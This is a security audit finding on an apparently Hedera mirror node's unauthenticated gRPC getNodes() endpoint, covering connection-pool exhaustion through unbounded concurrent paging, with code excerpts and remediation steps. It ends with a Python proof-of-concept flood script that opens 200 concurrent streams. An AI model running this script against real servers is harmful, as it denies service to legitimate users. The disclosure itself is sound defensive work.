## Audit Report

## Title
Unauthenticated gRPC `getNodes()` Enables Connection Pool Exhaustion via Unbounded Concurrent Paging

## Summary
The gRPC `getNodes()` endpoint accepts requests from any unauthenticated caller with no rate limiting. Each call drives repeated `page()` invocations, and every `page()` call synchronously acquires a JDBC connection from the shared `readOnly` `TransactionOperations` pool. An attacker opening many concurrent gRPC streams can exhaust the connection pool, denying service to all other components sharing the same `PlatformTransactionManager`.

## Finding Description

`NetworkController.getNodes()` (lines 33–43) accepts any `AddressBookQuery` with no authentication or rate-limiting check:

```java
public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
    final var disposable = Mono.fromCallable(() -> toFilter(request))
            .flatMapMany(networkService::getNodes)
            ...
``` [1](#0-0) 

It delegates to `NetworkServiceImpl.getNodes()`, which builds a `Flux` that calls `page()` repeatedly via `repeatWhen` until `context.isComplete()`, with a 250 ms delay between pages. When `limit=0`, `.take(Long.MAX_VALUE)` is used:

```java
return Flux.defer(() -> page(context))
        .repeatWhen(RepeatSpec.create(c -> !context.isComplete(), Long.MAX_VALUE)
                .withFixedDelay(addressBookProperties.getPageDelay()) // 250 ms default
                ...)
        .take(filter.getLimit() > 0 ? filter.getLimit() : Long.MAX_VALUE)
``` [2](#0-1) 

Every iteration of `page()` calls `transactionOperations.execute(...)`, which synchronously acquires a JDBC connection from the pool, executes the query, and releases it:

```java
private Flux<AddressBookEntry> page(AddressBookContext context) {
    return transactionOperations.execute(t -> {
        ...
        var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(...);
        ...
        return Flux.fromIterable(nodes);
    });
}
``` [3](#0-2) 

The `readOnly` `TransactionOperations` bean is a plain `TransactionTemplate` wrapping the shared `PlatformTransactionManager` — there is no dedicated or isolated pool for it:

```java
@Bean @Qualifier("readOnly")
TransactionOperations transactionOperationsReadOnly(PlatformTransactionManager transactionManager) {
    var transactionTemplate = new TransactionTemplate(transactionManager);
    transactionTemplate.setReadOnly(true);
    return transactionTemplate;
}
``` [4](#0-3) 

**Root cause:** No rate limiting, no per-IP throttling, and no authentication guard exists on the gRPC `getNodes()` path. A grep of all production gRPC source files for `ServerInterceptor` or `interceptor` returns zero matches — there are no production gRPC interceptors of any kind. The throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) lives exclusively in the `web3` module and is never wired into the `grpc` module. [5](#0-4) 

**Why `maxConcurrentCallsPerConnection` is insufficient:** The Netty server limits concurrent calls to N *per connection*, not globally. An attacker opens many TCP connections (HTTP/2 multiplexing makes this cheap), each carrying N concurrent streams, yielding an unbounded total number of concurrent `getNodes()` calls.

**Why caching does not prevent connection acquisition:** `transactionOperations.execute()` acquires a JDBC connection before the lambda body runs. Any repository-level cache lookup occurs *inside* the lambda, after the connection is already held.

## Impact Explanation
The shared HikariCP pool (Spring Boot default: 10 connections) is consumed by concurrent `page()` calls. Once exhausted, all other components sharing the same `PlatformTransactionManager` — including topic subscription queries and any other read paths — will block waiting for a connection or receive a connection-timeout exception. This degrades or denies service for all legitimate users of the mirror node gRPC API.

## Likelihood Explanation
The attack requires only a gRPC client library and network access to the mirror node's gRPC port. No credentials, tokens, or privileged access are needed. The attacker sends many concurrent `getNodes(limit=0)` requests across multiple TCP connections. The 250 ms `pageDelay` means each stream holds a connection slot briefly but repeatedly; with enough concurrent streams the aggregate demand continuously exceeds the pool size. This is trivially scriptable and repeatable. [6](#0-5) 

## Recommendation
1. **Rate limiting:** Add a gRPC `ServerInterceptor` that enforces per-IP or global request-rate limits on the `getNodes` method, analogous to the `ThrottleConfiguration` in the `web3` module.
2. **Global concurrency cap:** Use `maxConcurrentCallsPerConnection` in conjunction with a global semaphore or a bounded scheduler to cap the total number of concurrent `page()` executions, not just per-connection.
3. **Dedicated connection pool:** Configure a separate `DataSource` / `PlatformTransactionManager` for the address book read path with a small, bounded pool so exhaustion cannot cascade to other subsystems.
4. **Limit `limit=0` behavior:** Treat `limit=0` as "use server default" rather than `Long.MAX_VALUE`, or enforce a hard server-side cap on the maximum number of results per stream.

## Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import network_service_pb2_grpc, mirror_network_service_pb2

def flood():
    channel = grpc.insecure_channel("mirror-node:5600")
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    # limit=0 → Long.MAX_VALUE items, streams pages indefinitely
    for node in stub.getNodes(mirror_network_service_pb2.AddressBookQuery(limit=0)):
        pass

# Open many concurrent connections, each with concurrent streams
threads = [threading.Thread(target=flood) for _ in range(200)]
for t in threads:
    t.start()
```
Each thread opens a new TCP connection and issues a `getNodes(limit=0)` stream. Each stream drives repeated `page()` → `transactionOperations.execute()` calls. With 200 concurrent streams and a 10-connection HikariCP pool, the pool is exhausted within the first few page cycles, causing all other read transactions to time out.

    private Flux<AddressBookEntry> page(AddressBookContext context) {
        return transactionOperations.execute(t -> {
            var addressBookTimestamp = context.getAddressBookTimestamp();
            var nodeStakeMap = context.getNodeStakeMap();
            var nextNodeId = context.getNextNodeId();
            var pageSize = addressBookProperties.getPageSize();
            var nodes = addressBookEntryRepository.findByConsensusTimestampAndNodeId(
                    addressBookTimestamp, nextNodeId, pageSize);
            var endpoints = new AtomicInteger(0);

            nodes.forEach(node -> {
                // Override node stake
                node.setStake(nodeStakeMap.getOrDefault(node.getNodeId(), 0L));
                // This hack ensures that the nested serviceEndpoints is loaded eagerly and voids lazy init exceptions
                endpoints.addAndGet(node.getServiceEndpoints().size());
            });

            if (nodes.size() < pageSize) {
                context.completed();
            }

            log.info(
                    "Retrieved {} address book entries and {} endpoints for timestamp {} and node ID {}",
                    nodes.size(),
                    endpoints,
                    addressBookTimestamp,
                    nextNodeId);
            return Flux.fromIterable(nodes);
        });
    }
